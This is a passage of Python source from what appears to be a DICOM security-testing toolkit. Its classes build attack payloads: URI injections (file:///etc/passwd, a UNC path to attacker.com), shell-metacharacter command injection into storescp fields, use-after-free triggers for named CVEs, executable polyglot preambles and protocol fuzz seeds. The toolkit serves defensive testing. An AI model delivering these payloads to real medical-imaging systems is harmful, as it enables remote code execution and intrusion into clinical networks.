    def file_uri_injection() -> AttackResult:
        """file:// protocol injection. CVE-2024-33606."""
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1190, 'UR', 'file:///etc/passwd')
        ds = ds / Element(0x0040, 0xE010, 'UR', 'file:///C:/Windows/System32/config/SAM')
        
        return AttackResult(
            name='file_uri_injection',
            category='logic',
            payload=ds.encode(),
            description='file:// URIs in UR tags',
            expected_behavior='Viewer should block file:// protocol',
            metadata={'cve': 'CVE-2024-33606'}
        )
    
    @staticmethod
    def unc_path_injection() -> AttackResult:
        """UNC path injection. CVE-2024-33606."""
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1190, 'UR', '\\\\attacker.com\\share\\malware.exe')
        
        return AttackResult(
            name='unc_path_injection',
            category='logic',
            payload=ds.encode(),
            description='UNC path in URI tag',
            expected_behavior='Viewer should block UNC paths',
            metadata={'cve': 'CVE-2024-33606'}
        )
    
    @staticmethod
    def data_uri_script() -> AttackResult:
        """data: URI with script. CVE-2024-33606."""
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1190, 'UR', 'data:text/html,<script>alert(1)</script>')
        
        return AttackResult(
            name='data_uri_script',
            category='logic',
            payload=ds.encode(),
            description='data: URI with script in UR tag',
            expected_behavior='Viewer should not execute data: URIs',
            metadata={'cve': 'CVE-2024-33606'}
        )

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield every logic attack payload."""
        yield cls.transfer_syntax_mismatch()
        yield cls.sop_class_mismatch()
        yield cls.private_creator_missing()
        yield cls.uri_ssrf()
        yield cls.file_uri_injection()
        yield cls.unc_path_injection()
        yield cls.data_uri_script()


# =============================================================================
# Command Injection Attacks - shell metacharacters in storescp exec placeholders
# =============================================================================

class CommandInjectionAttacks:
    """
    Shell command injection via storescp's execution-option placeholders
    (DCMTK issue #1194).

    ``storescp`` substitutes attacker-controlled DICOM values into a command
    run through ``/bin/sh -c`` whenever ``--exec-on-reception`` (``-xcr``) or
    ``--exec-on-eostudy`` (``-xcs``) is configured:

        #f  <- received file name -- derived from SOP Instance UID (0008,0018)
        #p  <- received path      -- derived from Study Instance UID (0020,000D)
                                     with --sort-on-study-uid (-su), or from
                                     Patient Name (0010,0010) with
                                     --sort-on-patientname (-sp)
        #r  <- reverse-DNS name of the calling SCU's host

    DCMTK added allowlist sanitisation for the AE-title placeholders #a/#c in
    Feb 2024 (issue #1109) but not for #f/#p/#r. An unauthenticated SCU that
    embeds shell metacharacters in these fields achieves RCE on the storescp
    host; a hardened storescp must strip or reject them.

    The #r vector depends on the SCU host's reverse-DNS record, not on the
    DICOM object, so it is documented here but not emitted as a payload.

    Pure payload generators - no network I/O. Deliver with
    ``deliver.send_cstore`` so the crafted UID also reaches the C-STORE
    command set; ``metadata`` carries the matching sop_class_uid /
    sop_instance_uid.
    """

    # Benign proof-of-concept canary: creates a marker file, destroys nothing.
    _CANARY = '/tmp/c-scare-rce'

    # (id, injected suffix, description) - shell metacharacters left
    # unsanitised on the #f / #p / #r placeholders.
    _SHELL_PAYLOADS = [
        ('semicolon',   '; touch ' + _CANARY + ' ;',  'command separator'),
        ('pipe',        '| touch ' + _CANARY,         'pipe to a second command'),
        ('subshell',    '$(touch ' + _CANARY + ')',   'command substitution'),
        ('backtick',    '`touch ' + _CANARY + '`',    'backtick substitution'),
        ('logical_and', '&& touch ' + _CANARY,        'conditional chaining'),
        ('newline',     '\ntouch ' + _CANARY + '\n',  'newline-injected command'),
        ('redirect',    '> ' + _CANARY,               'output redirection'),
    ]

    @classmethod
    def _lookup(cls, payload_id: str) -> Tuple[str, str]:
        """Return (suffix, description) for a shell payload id."""
        for pid, suffix, note in cls._SHELL_PAYLOADS:
            if pid == payload_id:
                return suffix, note
        raise ValueError(f'unknown shell payload id: {payload_id!r}')

    @staticmethod
    def _base_dataset() -> Dataset:
        """A small, storable image object carrying placeholder identifiers."""
        ds = Dataset()
        ds = ds / Element(0x0008, 0x0016, 'UI', SECONDARY_CAPTURE_SOP_CLASS_UID)
        ds = ds / Element(0x0008, 0x0018, 'UI', '1.2.3.4.5')      # SOP Instance UID
        ds = ds / Element(0x0008, 0x0060, 'CS', 'OT')             # Modality
        ds = ds / Element(0x0010, 0x0010, 'PN', 'Doe^John')       # Patient Name
        ds = ds / Element(0x0010, 0x0020, 'LO', '12345')          # Patient ID
        ds = ds / Element(0x0020, 0x000D, 'UI', '1.2.3.4.5.1')    # Study Instance UID
        ds = ds / Element(0x0020, 0x000E, 'UI', '1.2.3.4.5.2')    # Series Instance UID
        return ds

    @classmethod
    def sop_instance_uid_injection(cls, payload_id: str = 'semicolon') -> AttackResult:
        """Shell metacharacters in SOP Instance UID - storescp #f placeholder."""
        suffix, note = cls._lookup(payload_id)
        malicious = '1.2.3.4.5' + suffix
        ds = cls._base_dataset()
        ds[0x00080018] = Element(0x0008, 0x0018, 'UI', malicious)
        return AttackResult(
            name=f'cmd_injection_sop_uid_{payload_id}',
            category='command_injection',
            payload=ds.encode(),
            description=f'SOP Instance UID carries a {note}',
            expected_behavior='storescp must sanitise shell metacharacters '
                              'before substituting the #f placeholder',
            metadata={
                'dcmtk_issue': 1194,
                'placeholder': '#f',
                'requires_option': '--exec-on-reception / --exec-on-eostudy',
                'target_field': '(0008,0018) SOP Instance UID',
                'shell_payload': suffix,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': malicious,
            },
        )

    @classmethod
    def study_instance_uid_injection(cls, payload_id: str = 'semicolon') -> AttackResult:
        """Shell metacharacters in Study Instance UID - storescp #p placeholder.

        Reached when storescp also runs with --sort-on-study-uid (-su), which
        names the per-study subdirectory after the Study Instance UID.
        """
        suffix, note = cls._lookup(payload_id)
        malicious = '1.2.3.4.5.1' + suffix
        ds = cls._base_dataset()
        ds[0x0020000D] = Element(0x0020, 0x000D, 'UI', malicious)
        return AttackResult(
            name=f'cmd_injection_study_uid_{payload_id}',
            category='command_injection',
            payload=ds.encode(),
            description=f'Study Instance UID carries a {note}',
            expected_behavior='storescp must sanitise shell metacharacters '
                              'before substituting the #p placeholder',
            metadata={
                'dcmtk_issue': 1194,
                'placeholder': '#p',
                'requires_option': '--exec-on-* with --sort-on-study-uid (-su)',
                'target_field': '(0020,000D) Study Instance UID',
                'shell_payload': suffix,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @classmethod
    def patient_name_injection(cls, payload_id: str = 'semicolon') -> AttackResult:
        """Shell metacharacters in Patient Name - storescp #p placeholder.

        Reached when storescp also runs with --sort-on-patientname (-sp),
        which names the per-patient subdirectory after the Patient Name.
        """
        suffix, note = cls._lookup(payload_id)
        malicious = 'Doe^John' + suffix
        ds = cls._base_dataset()
        ds[0x00100010] = Element(0x0010, 0x0010, 'PN', malicious)
        return AttackResult(
            name=f'cmd_injection_patient_name_{payload_id}',
            category='command_injection',
            payload=ds.encode(),
            description=f'Patient Name carries a {note}',
            expected_behavior='storescp must sanitise shell metacharacters '
                              'before substituting the #p placeholder',
            metadata={
                'dcmtk_issue': 1194,
                'placeholder': '#p',
                'requires_option': '--exec-on-* with --sort-on-patientname (-sp)',
                'target_field': '(0010,0010) Patient Name',
                'shell_payload': suffix,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield every command-injection attack payload."""
        # #f - the SOP Instance UID is always attacker-controlled: full sweep.
        for pid, _suffix, _note in cls._SHELL_PAYLOADS:
            yield cls.sop_instance_uid_injection(pid)
        # #p via Study Instance UID (needs --sort-on-study-uid).
        for pid in ('semicolon', 'subshell', 'backtick'):
            yield cls.study_instance_uid_injection(pid)
        # #p via Patient Name (needs --sort-on-patientname).
        for pid in ('semicolon', 'subshell', 'newline'):
            yield cls.patient_name_injection(pid)


# =============================================================================
# State Machine Attacks - DICOM state machine (Sta1-Sta13) violations
# =============================================================================

class StateMachineAttacks:
    """
    Attacks targeting the DICOM state machine (PS3.8 Chapter 9).

    Pure payload generators — no network I/O. Each method returns an
    AttackResult whose ``payload`` is the complete PDU bytes. Multi-step
    sequences store individual PDUs in ``metadata['steps']``.
    Use ``deliver.send_pdu`` or ``deliver.send_sequence`` to deliver.
    """

    @staticmethod
    def pdata_before_assoc() -> AttackResult:
        """P-DATA-TF before association (Sta1 violation)."""
        pdu_bytes = ProtocolAttacks.pdata_without_association().payload
        return AttackResult(
            name='pdata_before_assoc',
            category='state_machine',
            payload=pdu_bytes,
            description='P-DATA-TF in Sta1 (should only accept A-ASSOCIATE-RQ)',
            expected_behavior='Target should abort or ignore',
        )

    @staticmethod
    def release_before_assoc() -> AttackResult:
        """A-RELEASE-RQ before association."""
        if not SCAPY_AVAILABLE:
            pdu_bytes = b'\x05\x00' + struct.pack('!I', 4) + b'\x00' * 4
        else:
            pkt = DICOM() / A_RELEASE_RQ()
            pdu_bytes = raw(pkt)
        return AttackResult(
            name='release_before_assoc',
            category='state_machine',
            payload=pdu_bytes,
            description='A-RELEASE-RQ in Sta1',
            expected_behavior='Target should abort',
        )

    @staticmethod
    def double_association() -> AttackResult:
        """Two A-ASSOCIATE-RQ (second should fail)."""
        assoc_result = ProtocolAttacks.double_association()
        steps = assoc_result.metadata['steps']
        return AttackResult(
            name='sm_double_association',
            category='state_machine',
            payload=assoc_result.payload,
            description='Second A-ASSOCIATE-RQ in Sta6',
            expected_behavior='Target should abort on second RQ',
            metadata={'steps': steps},
        )

    @staticmethod
    def release_then_pdata() -> AttackResult:
        """A-RELEASE-RQ followed by P-DATA-TF."""
        assoc_result = ProtocolAttacks.double_association()
        assoc_pdu = assoc_result.metadata['steps'][0]

        if not SCAPY_AVAILABLE:
            release_pdu = b'\x05\x00' + struct.pack('!I', 4) + b'\x00' * 4
            pdata_pdu = b'\x04\x00' + struct.pack('!I', 20) + b'\x00' * 20
        else:
            release_pdu = raw(DICOM() / A_RELEASE_RQ())
            cmd = C_ECHO_RQ(message_id=1)
            pdv = PresentationDataValueItem(
                context_id=1,
                is_last=1, is_command=1,
                data=raw(cmd),
            )
            pdata_pdu = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))

        steps = [assoc_pdu, release_pdu, pdata_pdu]
        return AttackResult(
            name='release_then_pdata',
            category='state_machine',
            payload=assoc_pdu + release_pdu + pdata_pdu,
            description='P-DATA-TF after A-RELEASE-RQ',
            expected_behavior='Target should abort',
            metadata={'steps': steps},
        )

    @staticmethod
    def incomplete_fragment() -> AttackResult:
        """Partial P-DATA marked as 'not last', then close."""
        assoc_result = ProtocolAttacks.double_association()
        assoc_pdu = assoc_result.metadata['steps'][0]

        if SCAPY_AVAILABLE:
            pdv = PresentationDataValueItem(
                context_id=1,
                is_last=0, is_command=0,  # Not last, not command
                data=b'partial data here',
            )
            pdata = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
        else:
            pdata = b'\x04\x00' + struct.pack('!I', 24) + b'\x00\x00\x00\x14\x01\x00' + b'partial data here'

        steps = [assoc_pdu, pdata]
        return AttackResult(
            name='incomplete_fragment',
            category='state_machine',
            payload=assoc_pdu + pdata,
            description='Partial P-DATA-TF then close',
            expected_behavior='Target should handle incomplete transfer',
            metadata={'steps': steps},
        )

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield every state machine attack payload."""
        yield cls.pdata_before_assoc()
        yield cls.release_before_assoc()
        yield cls.double_association()
        yield cls.release_then_pdata()
        yield cls.incomplete_fragment()


# =============================================================================
# CVE Attacks - CVE-specific reproductions
# =============================================================================

class CVEAttacks:
    """
    CVE-specific test cases organized by CVE number.
    
    Each method generates one or more AttackResult objects that reproduce
    the conditions described in the CVE.
    """
    
    # -------------------------------------------------------------------------
    # CVE-2023-32135: Use-After-Free in DCM File Parsing
    # -------------------------------------------------------------------------
    
    @staticmethod
    def cve_2023_32135_sequence_uaf() -> List[AttackResult]:
        """
        CVE-2023-32135: Use-After-Free in DCM File Parsing
        
        The parser attempts to access DICOM elements after referenced
        memory has been freed. Tests sequence pointer attacks.
        """
        results = []
        
        # Test 1: Omit critical sequence tags
        data = struct.pack('<HH', 0x7FE0, 0x0010)  # Pixel Data tag
        data += b'SQ'
        data += b'\x00\x00'
        data += struct.pack('<I', 0xFFFFFFFF)  # Undefined length
        # No sequence items - reference will dangle
        data += struct.pack('<HH', 0xFFFE, 0xE0DD)  # Sequence delim
        data += struct.pack('<I', 0)
        
        results.append(AttackResult(
            name='cve_2023_32135_01_missing_sequence_items',
            category='cve',
            payload=data,
            description='Sequence with undefined length but no items',
            expected_behavior='Parser may access freed sequence memory',
            metadata={'cve': 'CVE-2023-32135'}
        ))
        
        # Test 2: Invalid nested dataset pointers (beyond EOF)
        data = struct.pack('<HH', 0x0008, 0x1115)  # Referenced Series Sequence
        data += b'SQ'
        data += b'\x00\x00'
        data += struct.pack('<I', 0xFFFFFFFF)
        data += struct.pack('<HH', 0xFFFE, 0xE000)  # Item
        data += struct.pack('<I', 0x7FFFFFFF)  # Points way beyond EOF
        # No actual item data
        
        results.append(AttackResult(
            name='cve_2023_32135_02_invalid_nested_pointer',
            category='cve',
            payload=data,
            description='Sequence item with offset beyond EOF',
            expected_behavior='Parser should detect invalid offset',
            metadata={'cve': 'CVE-2023-32135'}
        ))
        
        # Test 3: Premature sequence termination (truncated file)
        data = struct.pack('<HH', 0x0040, 0xA730)  # Content Sequence
        data += b'SQ'
        data += b'\x00\x00'
        data += struct.pack('<I', 0xFFFFFFFF)
        data += struct.pack('<HH', 0xFFFE, 0xE000)  # Item start
        data += struct.pack('<I', 0xFFFFFFFF)
        data += struct.pack('<HH', 0x0008, 0x0100)  # Some element
        # Truncate here - no delimiters
        
        results.append(AttackResult(
            name='cve_2023_32135_03_premature_termination',
            category='cve',
            payload=data,
            description='Sequence truncated without delimiters',
            expected_behavior='Parser may leave dangling references',
            metadata={'cve': 'CVE-2023-32135'}
        ))
        
        return results
    
    # -------------------------------------------------------------------------
    # CVE-2024-24793: Use-After-Free in File Meta Information
    # -------------------------------------------------------------------------
    
    @staticmethod
    def cve_2024_24793_duplicate_meta_tags() -> List[AttackResult]:
        """
        CVE-2024-24793: Use-After-Free in File Meta Information
        
        When inserting duplicate tags into File Meta Information header,
        the element is freed but still referenced.
        """
        results = []
        
        # Test 1: Duplicate Transfer Syntax UID
        meta = b'\x00' * 128 + b'DICM'
        # First Transfer Syntax
        meta += struct.pack('<HH', 0x0002, 0x0010)
        meta += b'UI'
        meta += struct.pack('<H', 18)
        meta += b'1.2.840.10008.1.2\x00'
        # DUPLICATE Transfer Syntax
        meta += struct.pack('<HH', 0x0002, 0x0010)
        meta += b'UI'
        meta += struct.pack('<H', 20)
        meta += b'1.2.840.10008.1.2.1\x00'
        
        results.append(AttackResult(
            name='cve_2024_24793_01_duplicate_transfer_syntax',
            category='cve',
            payload=meta,
            description='Two Transfer Syntax UID elements in meta header',
            expected_behavior='Parser may UAF on duplicate insertion',
            metadata={'cve': 'CVE-2024-24793'}
        ))
        
        # Test 2: Duplicate Media Storage SOP Class
        meta = b'\x00' * 128 + b'DICM'
        meta += struct.pack('<HH', 0x0002, 0x0002)
        meta += b'UI'
        meta += struct.pack('<H', 26)
        meta += b'1.2.840.10008.5.1.4.1.1.2\x00'
        meta += struct.pack('<HH', 0x0002, 0x0002)  # DUPLICATE
        meta += b'UI'
        meta += struct.pack('<H', 26)
        meta += b'1.2.840.10008.5.1.4.1.1.4\x00'
        
        results.append(AttackResult(
            name='cve_2024_24793_02_duplicate_sop_class',
            category='cve',
            payload=meta,
            description='Two Media Storage SOP Class elements',
            expected_behavior='Parser may UAF on duplicate',
            metadata={'cve': 'CVE-2024-24793'}
        ))
        
        # Test 3: Duplicate with different VRs
        meta = b'\x00' * 128 + b'DICM'
        meta += struct.pack('<HH', 0x0002, 0x0010)
        meta += b'UI'
        meta += struct.pack('<H', 18)
        meta += b'1.2.840.10008.1.2\x00'
        meta += struct.pack('<HH', 0x0002, 0x0010)
        meta += b'LO'  # Different VR!
        meta += struct.pack('<H', 20)
        meta += b'1.2.840.10008.1.2.1\x00'
        
        results.append(AttackResult(
            name='cve_2024_24793_03_duplicate_different_vr',
            category='cve',
            payload=meta,
            description='Duplicate tag with conflicting VRs',
            expected_behavior='Parser confusion on VR',
            metadata={'cve': 'CVE-2024-24793'}
        ))
        
        # Test 4: Rapid duplicate sequence (many duplicates)
        meta = b'\x00' * 128 + b'DICM'
        for i in range(10):
            meta += struct.pack('<HH', 0x0002, 0x0010)
            meta += b'UI'
            meta += struct.pack('<H', 18)
            meta += b'1.2.840.10008.1.2\x00'
        
        results.append(AttackResult(
            name='cve_2024_24793_04_rapid_duplicates',
            category='cve',
            payload=meta,
            description='10 consecutive duplicate Transfer Syntax tags',
            expected_behavior='Multiple UAF opportunities',
            metadata={'cve': 'CVE-2024-24793'}
        ))
        
        return results
    
    # -------------------------------------------------------------------------
    # CVE-2024-24794: Use-After-Free in Sequence Value Representation
    # -------------------------------------------------------------------------
    
    @staticmethod
    def cve_2024_24794_sequence_duplicates() -> List[AttackResult]:
        """
        CVE-2024-24794: Use-After-Free in Sequence parsing
        
        Similar to CVE-2024-24793 but occurs in nested sequence parsing.
        """
        results = []
        
        # Test 1: Duplicate tags in nested sequence
        data = struct.pack('<HH', 0x0008, 0x1115)  # Referenced Series Sequence
        data += b'SQ'
        data += b'\x00\x00'
        data += struct.pack('<I', 0xFFFFFFFF)
        data += struct.pack('<HH', 0xFFFE, 0xE000)  # Item
        data += struct.pack('<I', 0xFFFFFFFF)
        # First element
        data += struct.pack('<HH', 0x0008, 0x1150)
        data += b'UI'
        data += struct.pack('<H', 10)
        data += b'1.2.3.4.5\x00'
        # DUPLICATE element
        data += struct.pack('<HH', 0x0008, 0x1150)
        data += b'UI'
        data += struct.pack('<H', 12)
        data += b'1.2.3.4.5.6\x00'
        data += struct.pack('<HH', 0xFFFE, 0xE00D)  # Item delim
        data += struct.pack('<I', 0)
        data += struct.pack('<HH', 0xFFFE, 0xE0DD)  # Sequence delim
        data += struct.pack('<I', 0)
        
        results.append(AttackResult(
            name='cve_2024_24794_01_duplicate_in_sequence',
            category='cve',
            payload=data,
            description='Duplicate tag within sequence item',
            expected_behavior='Parser may UAF in sequence context',
            metadata={'cve': 'CVE-2024-24794'}
        ))
        
        # Test 2: Duplicate sequence delimiters
        data = struct.pack('<HH', 0x0008, 0x1115)
        data += b'SQ'
        data += b'\x00\x00'
        data += struct.pack('<I', 0xFFFFFFFF)
        data += struct.pack('<HH', 0xFFFE, 0xE000)
        data += struct.pack('<I', 0xFFFFFFFF)
        data += struct.pack('<HH', 0xFFFE, 0xE00D)  # Item delim
        data += struct.pack('<I', 0)
        data += struct.pack('<HH', 0xFFFE, 0xE0DD)  # Sequence delim
        data += struct.pack('<I', 0)
        data += struct.pack('<HH', 0xFFFE, 0xE0DD)  # DUPLICATE delim
        data += struct.pack('<I', 0)
        
        results.append(AttackResult(
            name='cve_2024_24794_02_duplicate_delimiters',
            category='cve',
            payload=data,
            description='Multiple sequence delimitation items',
            expected_behavior='Parser may process freed delimiter',
            metadata={'cve': 'CVE-2024-24794'}
        ))
        
        # Test 3: Deeply nested duplicates (5 levels)
        data = b''
        for level in range(5):
            data += struct.pack('<HH', 0x0040, 0xA730)
            data += b'SQ'
            data += b'\x00\x00'
            data += struct.pack('<I', 0xFFFFFFFF)
            data += struct.pack('<HH', 0xFFFE, 0xE000)
            data += struct.pack('<I', 0xFFFFFFFF)
            # Duplicate at each level
            data += struct.pack('<HH', 0x0008, 0x0100)
            data += b'SH'
            data += struct.pack('<H', 4)
            data += b'ABC\x00'
            data += struct.pack('<HH', 0x0008, 0x0100)  # DUPLICATE
            data += b'SH'
            data += struct.pack('<H', 4)
            data += b'XYZ\x00'
        
        # Close all levels
        for level in range(5):
            data += struct.pack('<HH', 0xFFFE, 0xE00D)
            data += struct.pack('<I', 0)
            data += struct.pack('<HH', 0xFFFE, 0xE0DD)
            data += struct.pack('<I', 0)
        
        results.append(AttackResult(
            name='cve_2024_24794_03_deeply_nested_duplicates',
            category='cve',
            payload=data,
            description='5 levels of nesting with duplicates at each',
            expected_behavior='UAF at multiple nesting levels',
            metadata={'cve': 'CVE-2024-24794'}
        ))
        
        return results
    
    # -------------------------------------------------------------------------
    # CVE-2019-11687: Executable Embedding (PEDICOM/ELFDICOM)
    # -------------------------------------------------------------------------
    
    @staticmethod
    def cve_2019_11687_polyglot() -> List[AttackResult]:
        """
        CVE-2019-11687: Executable Embedding in DICOM Preamble
        
        The 128-byte preamble can contain PE/ELF headers, making the file
        valid as both DICOM and executable.
        """
        results = []
        
        # Test 1: Minimal PE header in preamble
        # DOS Header
        dos_header = b'MZ' + b'\x00' * 58  # MZ signature + padding
        dos_header += struct.pack('<I', 0x80)  # e_lfanew points to offset 128 (after preamble)
        dos_header += b'\x00' * (64 - len(dos_header))  # Pad DOS header to 64 bytes
        dos_header += b'\x00' * 64  # Rest of preamble
        
        file_data = dos_header + b'DICM'
        # Add minimal dataset
        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'
        
        results.append(AttackResult(
            name='cve_2019_11687_01_pe_header',
            category='cve',
            payload=file_data,
            description='DOS/PE header in DICOM preamble (PEDICOM)',
            expected_behavior='Scanner should detect PE signature',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE'}
        ))
        
        # Test 2: ELF header in preamble
        elf_header = b'\x7FELF'  # ELF magic
        elf_header += b'\x02'  # 64-bit
        elf_header += b'\x01'  # Little endian
        elf_header += b'\x01'  # ELF version
        elf_header += b'\x00' * (128 - len(elf_header))  # Pad
        
        file_data = elf_header + b'DICM'
        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'
        
        results.append(AttackResult(
            name='cve_2019_11687_02_elf_header',
            category='cve',
            payload=file_data,
            description='ELF header in DICOM preamble (ELFDICOM)',
            expected_behavior='Scanner should detect ELF signature',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'ELF'}
        ))
        
        # Test 3: Shell script in preamble
        script = b'#!/bin/sh\necho "pwned"\n#'
        script += b'\x00' * (128 - len(script))
        
        file_data = script + b'DICM'
        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'
        
        results.append(AttackResult(
            name='cve_2019_11687_03_script_preamble',
            category='cve',
            payload=file_data,
            description='Shell script in DICOM preamble',
            expected_behavior='Scanner should detect script',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'shell'}
        ))
        
        # Test 4: Batch script in preamble
        batch = b'@echo off\r\necho pwned\r\nREM '
        batch += b' ' * (128 - len(batch))
        
        file_data = batch + b'DICM'
        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'
        
        results.append(AttackResult(
            name='cve_2019_11687_04_batch_preamble',
            category='cve',
            payload=file_data,
            description='Batch script in DICOM preamble',
            expected_behavior='Scanner should detect batch script',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'batch'}
        ))

        # Test 5: TIFF header in preamble (dual-purpose TIFF/DICOM)
        # The CVE explicitly cites whole-slide-imaging TIFF/DICOM polyglots
        # as a real-world dual-purpose case.
        tiff = b'II*\x00'                     # TIFF little-endian (Intel) magic
        tiff += struct.pack('<I', 8)          # offset to first IFD
        tiff += struct.pack('<H', 0)          # IFD with 0 directory entries
        tiff += struct.pack('<I', 0)          # no next IFD
        tiff += b'\x00' * (128 - len(tiff))   # pad out the 128-byte preamble

        file_data = tiff + b'DICM'
        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'

        results.append(AttackResult(
            name='cve_2019_11687_05_tiff_header',
            category='cve',
            payload=file_data,
            description='TIFF header in DICOM preamble (dual-purpose TIFF/DICOM)',
            expected_behavior='Scanner should detect TIFF signature',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'TIFF'}
        ))

        return results

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield every CVE attack payload (flattened from lists)."""
        yield from cls.cve_2023_32135_sequence_uaf()
        yield from cls.cve_2024_24793_duplicate_meta_tags()
        yield from cls.cve_2024_24794_sequence_duplicates()
        yield from cls.cve_2019_11687_polyglot()


# =============================================================================
# Protocol Seed Generator - emit varied PDU payloads for an AFL/AFLNet corpus
# =============================================================================

class ProtocolSeedGenerator:
    """
    Emit varied A-ASSOCIATE-RQ / C-STORE-RQ payloads.

    This is a seed generator, not a fuzzer: it produces a finite set of
    payloads with no coverage feedback. Use it to seed an AFL++/AFLNet
    corpus (grey-box) or as one-shot black-box DAST probes. The actual
    mutation loop belongs to AFL++/AFLNet.

    Example:
        for result in ProtocolSeedGenerator.fuzz_association(count=100):
            deliver.send_pdu(target, result.payload)
    """

    @staticmethod
    def fuzz_association(count: int = 100) -> Generator[AttackResult, None, None]:
        """Yield fuzzed A-ASSOCIATE-RQ payloads."""
        for i in range(count):
            try:
                if SCAPY_AVAILABLE:
                    pdu_bytes = raw(fuzz(DICOM() / A_ASSOCIATE_RQ()))
                    mutation = 'scapy_fuzz'
                else:
                    pdu_bytes = ProtocolAttacks.malformed_protocol_version(
                        random.randint(0, 0xFFFF)
                    ).payload
                    mutation = 'protocol_version'

                yield AttackResult(
                    name=f'fuzz_assoc_{i}',
                    category='fuzzer',
                    payload=pdu_bytes,
                    description=f'Fuzzed A-ASSOCIATE-RQ #{i}',
                    expected_behavior='Target should handle gracefully',
                    metadata={'mutation': mutation},
                )
            except Exception as e:
                yield AttackResult(
                    name=f'fuzz_assoc_{i}',
                    category='fuzzer',
                    payload=b'',
                    description=f'Generation error: {e}',
                    expected_behavior='N/A',
                    success=False,
                    metadata={'error': str(e)},
                )

    @staticmethod
    def fuzz_cstore(sop_class_uid: str = None,
                    count: int = 100) -> Generator[AttackResult, None, None]:
        """Yield fuzzed C-STORE-RQ payloads."""
        sop_class = sop_class_uid or CT_IMAGE_STORAGE_SOP_CLASS_UID

        for i in range(count):
            try:
                if not SCAPY_AVAILABLE:
                    yield AttackResult(
                        name=f'fuzz_cstore_{i}',
                        category='fuzzer',
                        payload=b'',
                        description='Scapy not available',
                        expected_behavior='N/A',
                        success=False,
                    )
                    continue

                if i % 5 == 0:
                    cmd = C_STORE_RQ(
                        command_group_length=random.choice([0, 10, 0xFFFF, 0xFFFFFFFF]),
                        affected_sop_class_uid=_uid_to_bytes(sop_class),
                        affected_sop_instance_uid=f'1.2.3.{i}'.encode(),
                        message_id=random.randint(1, 65535),
                    )
                    mutation = 'group_length'
                elif i % 5 == 1:
                    cmd = C_STORE_RQ(
                        command_group_length=100,
                        affected_sop_class_uid=b'1.2.3.4.5',
                        affected_sop_instance_uid=b'1.2.3.4.5.6.7',
                        message_id=1,
                    )
                    mutation = 'odd_length_uid'
                elif i % 5 == 2:
                    cmd = C_STORE_RQ(
                        affected_sop_class_uid=sop_class,
                        affected_sop_instance_uid=f'1.2.3.{i}',
                        message_id=1,
                    )
                    cmd.command_field = 0xDEAD
                    mutation = 'invalid_command'
                else:
                    cmd = fuzz(C_STORE_RQ())
                    cmd.affected_sop_class_uid = sop_class
                    cmd.affected_sop_instance_uid = f'1.2.3.{i}'
                    mutation = 'scapy_fuzz'

                yield AttackResult(
                    name=f'fuzz_cstore_{i}',
                    category='fuzzer',
                    payload=raw(cmd),
                    description=f'Fuzzed C-STORE-RQ #{i}',
                    expected_behavior='Target should handle gracefully',
                    metadata={'mutation': mutation},
                )
            except Exception as e:
                yield AttackResult(
                    name=f'fuzz_cstore_{i}',
                    category='fuzzer',
                    payload=b'',
                    description=f'Generation error: {e}',
                    expected_behavior='N/A',
                    success=False,
                    metadata={'error': str(e)},
                )

    @classmethod
    def all(cls, count: int = 10) -> Generator[AttackResult, None, None]:
        """Yield seed payloads from both the association and cstore generators."""
        yield from cls.fuzz_association(count=count)
        yield from cls.fuzz_cstore(count=count)


# Deprecated alias - kept for backward compatibility.
ProtocolFuzzer = ProtocolSeedGenerator


# =============================================================================
# Targeted Seed Generator - pydicom-structure-aware corpus emitter
# =============================================================================

class TargetedSeedGenerator:
    """
    Generate structure-aware seed payloads from a real pydicom dataset.

    Uses pydicom to understand a dataset's structure, then emits targeted
    corruptions of it. Like ProtocolSeedGenerator this is a seed emitter,
    not a fuzzing engine - feed its output to AFL++ as a corpus, or deliver
    it as black-box DAST probes.
    """
    
    def __init__(self, pydicom_dataset):
        """Initialize with pydicom dataset."""
        self.source = pydicom_dataset
        self.corruptor = Corruptor(pydicom_dataset)
    
    def target_vr_parser(self, vr: str) -> Generator[AttackResult, None, None]:
        """Generate attacks targeting specific VR parser."""
        invalid_vrs = ['XX', '\x00\x00', 'ZZ', '!!', '  ']
        
        for tag in self.source.keys():
            elem = self.source[tag]
            if hasattr(elem, 'VR') and elem.VR == vr:
                for invalid_vr in invalid_vrs:
                    c = Corruptor(self.source)
                    c.set_vr(tag, invalid_vr)
                    
                    yield AttackResult(
                        name=f'vr_fuzz_{tag}_{invalid_vr}',
                        category='targeted',
                        payload=c.to_bytes(),
                        description=f'Tag {tag} VR changed from {vr} to {invalid_vr}',
                        expected_behavior='Parser should handle gracefully',
                        metadata={'tag': tag, 'original_vr': vr, 'fuzzed_vr': invalid_vr}
                    )
    
